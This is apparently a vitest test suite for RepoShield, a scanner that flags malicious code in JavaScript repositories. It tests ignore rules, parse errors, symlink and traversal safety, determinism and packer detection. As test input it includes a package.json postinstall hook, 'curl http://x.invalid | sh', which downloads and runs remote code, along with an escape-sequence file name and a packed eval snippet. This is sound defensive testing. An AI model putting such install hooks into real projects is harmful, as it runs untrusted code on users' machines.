import fs from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { scan, scanFile, ConfigError } from "../src/index.js";
import { fixture, project, tmpDir, write } from "./helpers/project.js";

describe("ignore rules", () => {
  it("skips node_modules, build output, and minified files by default", async () => {
    const bad = fixture("malicious/shell-pipe.js.txt");
    const root = project({
      "node_modules/pkg/index.js": bad,
      "dist/bundle.js": bad,
      ".next/server.js": bad,
      "public/app.min.js": bad,
      "src/ok.js": "export {}",
    });
    const r = await scan({ root });
    expect(r.findings).toEqual([]);
    expect(r.summary.filesScanned).toBe(1);
  });

  it("honors .gitignore, .reposhieldignore and the ignore option", async () => {
    const bad = fixture("malicious/shell-pipe.js.txt");
    const root = project({
      ".gitignore": "generated/\n",
      ".reposhieldignore": "vendored-tool.js\n",
      "generated/a.js": bad,
      "vendored-tool.js": bad,
      "tmp/x.js": bad,
      "src/real.js": bad,
    });
    const r = await scan({ root, ignore: ["tmp/**"] });
    expect([...new Set(r.findings.map((f) => f.file))]).toEqual(["src/real.js"]);
    const noGitignore = await scan({ root, ignore: ["tmp/**"], respectGitignore: false });
    expect(noGitignore.findings.some((f) => f.file === "generated/a.js")).toBe(true);
  });
});

describe("malformed and unusual input", () => {
  it("does not crash on malformed JavaScript and records a coverage error", async () => {
    const root = project({
      "src/bad.js": fixture("malicious/malformed.js.txt"),
      "src/ok.js": fixture("benign/plain.js.txt"),
      "src/dup.js": "const a = 1;\nconst a = 2;\n",
    });
    const r = await scan({ root });
    expect(r.errors.some((e) => e.file === "src/bad.js" && e.kind === "parse")).toBe(true);
    expect(r.summary.filesScanned).toBeGreaterThanOrEqual(2);
    expect(r.findings.some((f) => f.ruleId === "RS-SCAN-001")).toBe(true);
  });

  it("treats unparseable config files and strict mode more seriously", async () => {
    const cfg = await scan({ root: project({ "vite.config.js": "const x = ;;; (((" }) });
    expect(cfg.findings.find((f) => f.ruleId === "RS-SCAN-001")?.severity).toBe("medium");
    const strict = await scan({ root: project({ "src/b.js": "function ((" }), mode: "strict" });
    expect(strict.safe).toBe(false);
  });

  it("parses TypeScript, JSX and modern syntax", async () => {
    const root = project({
      "a.tsx": `export const A = <T,>(p: { x: T }) => <div>{String(p.x)}</div>;\n`,
      "b.mts": `import fs from "node:fs";\nexport const x = fs?.existsSync?.("a") ?? false;\n`,
      "c.js": `class A { #p = 1; static { A.x = 2 } get p() { return this.#p } }\nawait Promise.resolve();\n`,
    });
    const r = await scan({ root });
    expect(r.errors.filter((e) => e.kind === "parse")).toEqual([]);
  });

  it("skips files above the size limit but flags oversize source files", async () => {
    const root = project({
      "src/huge.js": `// ${"x".repeat(5000)}\nexport {}\n`,
      "src/small.js": "export {}",
    });
    const r = await scan({ root, maxFileSizeBytes: 1000 });
    expect(r.errors.some((e) => e.kind === "too-large" && e.file === "src/huge.js")).toBe(true);
    expect(r.findings.find((f) => f.ruleId === "RS-SCAN-002")?.file).toBe("src/huge.js");
    expect(r.summary.filesScanned).toBe(1);
  });

  it("skips binary content", async () => {
    const root = project({});
    fs.writeFileSync(path.join(root, "blob.js"), Buffer.from([0x63, 0x00, 0x01, 0x02, 0x00]));
    const r = await scan({ root });
    expect(r.errors.some((e) => e.kind === "binary")).toBe(true);
  });

  it.skipIf(process.platform === "win32")(
    "strips terminal control characters from untrusted file names in text output",
    async () => {
      const { generateReport } = await import("../src/index.js");
      const root = project({});
      fs.writeFileSync(path.join(root, "evil\u001b[2Jname.js"), fixture("malicious/shell-pipe.js.txt"));
      const text = generateReport(await scan({ root }), { format: "text" });
      expect(text).not.toContain("\u001b[2J");
    },
  );
});

describe("path and symlink safety", () => {
  it.skipIf(process.platform === "win32")("does not follow symlinks that leave the root", async () => {
    const outside = tmpDir();
    write(outside, "evil.js", fixture("malicious/shell-pipe.js.txt"));
    const root = project({ "src/ok.js": "export {}" });
    fs.symlinkSync(path.join(outside, "evil.js"), path.join(root, "link.js"));
    fs.symlinkSync(outside, path.join(root, "linkdir"));
    for (const follow of [false, true]) {
      const r = await scan({ root, followSymlinks: follow });
      expect(r.findings).toEqual([]);
      expect(r.errors.filter((e) => e.kind === "symlink").length).toBeGreaterThanOrEqual(2);
      expect(r.errors.some((e) => /outside the project root/.test(e.message))).toBe(true);
    }
  });

  it.skipIf(process.platform === "win32")(
    "ignores in-root symlinks by default and follows them when asked",
    async () => {
      const root = project({ "real/a.js": fixture("malicious/shell-pipe.js.txt") });
      fs.symlinkSync(path.join(root, "real/a.js"), path.join(root, "alias.js"));
      expect((await scan({ root })).findings.every((f) => f.file === "real/a.js")).toBe(true);
      const followed = await scan({ root, followSymlinks: true });
      expect(followed.findings.some((f) => f.file === "alias.js")).toBe(true);
    },
  );

  it.skipIf(process.platform === "win32")("survives symlink loops", async () => {
    const root = project({ "a/x.js": "export {}" });
    fs.symlinkSync(root, path.join(root, "a/loop"));
    const r = await scan({ root, followSymlinks: true });
    expect(r.summary.filesScanned).toBe(1);
  });

  it.skipIf(process.platform === "win32")(
    "scanFile rejects path traversal and escaping symlinks",
    async () => {
      const outside = tmpDir();
      write(outside, "evil.js", fixture("malicious/shell-pipe.js.txt"));
      const root = project({ "src/ok.js": "export {}" });
      fs.symlinkSync(path.join(outside, "evil.js"), path.join(root, "src/link.js"));
      await expect(scanFile("../evil.js", { root })).rejects.toBeInstanceOf(ConfigError);
      await expect(scanFile(path.join(outside, "evil.js"), { root })).rejects.toThrow(/outside the root/);
      await expect(scanFile("src/link.js", { root })).rejects.toThrow(/symlink/);
      await expect(scanFile("src/missing.js", { root })).rejects.toThrow(/not found/);
      const ok = await scanFile("src/ok.js", { root });
      expect(ok.summary.filesScanned).toBe(1);
    },
  );
});

describe("determinism, limits, cancellation", () => {
  it("produces identical ci output across runs and concurrency settings", async () => {
    const root = project({
      "src/a.js": fixture("malicious/decode-exec.js.txt"),
      "src/b.js": fixture("malicious/exfil.js.txt"),
      "vite.config.js": fixture("malicious/vite.config.js.txt"),
      "package.json": JSON.stringify({ name: "x", scripts: { postinstall: "curl http://x.invalid | sh" } }),
    });
    const a = JSON.stringify(await scan({ root, mode: "ci", concurrency: 1 }));
    const b = JSON.stringify(await scan({ root, mode: "ci", concurrency: 16 }));
    const c = JSON.stringify(await scan({ root, mode: "ci" }));
    expect(a).toBe(b);
    expect(b).toBe(c);
    expect(JSON.parse(a).generatedAt).toBeUndefined();
    expect(JSON.parse(a).root).toBe(".");
  });

  it("reports an incomplete scan and fails strict policy when the file limit is hit", async () => {
    const files: Record<string, string> = {};
    for (let i = 0; i < 5; i++) files[`f${i}.js`] = "export {}";
    const r = await scan({ root: project(files), maxFiles: 2, mode: "strict" });
    expect(r.errors.some((e) => /File limit/.test(e.message))).toBe(true);
    expect(r.safe).toBe(false);
  });

  it("can be cancelled", async () => {
    const c = new AbortController();
    c.abort();
    await expect(scan({ root: project({ "a.js": "export {}" }), signal: c.signal })).rejects.toMatchObject({
      name: "AbortError",
    });
  });

  it("gives clear errors for invalid options and roots", async () => {
    await expect(scan({ mode: "nope" as never })).rejects.toThrow(/Invalid RepoShield options[\s\S]*mode/);
    await expect(scan({ failOn: "severe" as never })).rejects.toThrow(/failOn/);
    await expect(scan({ bogus: 1 } as never)).rejects.toThrow(/bogus/);
    await expect(scan({ root: "/definitely/not/here" })).rejects.toThrow(/does not exist/);
  });
});

describe("packer detection", () => {
  it("flags a real packer call but not a detector pattern inside a regex or string", async () => {
    const real = project({
      "a.js": "eval(function(p,a,c,k,e,d){return p}('0',1,1,'x'.split('|'),0,{}))\n",
    });
    const flagged = await scan({ root: real, includeGitHistory: false });
    expect(flagged.findings.some((f) => f.evidence.some((e) => e.includes("packer")))).toBe(true);

    const inert = project({
      "b.js":
        'const re = /eval\\(function\\(p,a,c,k,e,[dr]\\)/;\nconst s = "eval(function(p,a,c,k,e,d)";\nexport { re, s };\n',
    });
    const clean = await scan({ root: inert, includeGitHistory: false });
    expect(clean.findings.filter((f) => f.ruleId === "RS-OBF-001")).toEqual([]);
  });
});
